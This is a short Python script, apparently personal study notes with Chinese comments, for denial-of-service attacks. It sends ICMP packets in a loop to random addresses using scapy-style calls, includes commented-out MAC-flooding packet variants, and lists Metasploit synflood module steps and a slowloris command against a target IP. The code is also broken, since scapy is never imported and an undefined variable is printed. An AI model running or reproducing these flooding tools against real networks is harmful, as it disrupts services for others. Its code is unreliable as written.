"""
dos
二层
mac地址泛洪攻击

mac地址表
ip--mac
ip2--mac2
"""
import time
from random import *


def main():
    #dos
    while 1:
        #二层加三层
        # packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP())/ICMP()
        #单独二层
        # packet = Ether(src=RandMAC(), dst=RandMAC())
        #单独三层
        # packet = IP(src=RandIP()) / ICMP()

        #网络层
        pdst = "%i.%i.%i.%i"%(randint(1,254),randint(1,254),randint(1,254),randint(1,254))
        psrc= "192.168.3.112"
        send(IP(src=psrc,dst=pdst)/ICMP())

        """
        传输层拒绝服务攻击
        客户端对服务器发送syn(seq=x)print,进入syn_send状态
        目标服务器收到了syn，回syn(seq=y)+ack(ack=x+1),进入syn_recv状态
        客户端收到服务器的syn,回ack(ack=y+1),进入establish状态
        """

        """
        应用层DOS
        msfconsole
        use auxiliary/dos/tcp/synflood
        show options
        exploit
        
        慢速攻击
        pip install slowloris
        slowloris [目标ip] -s 1500
        """


        time.sleep(0.5)
        # sendp(packet)
        print(packet.summary())


    pass


if __name__ == '__main__':
    main()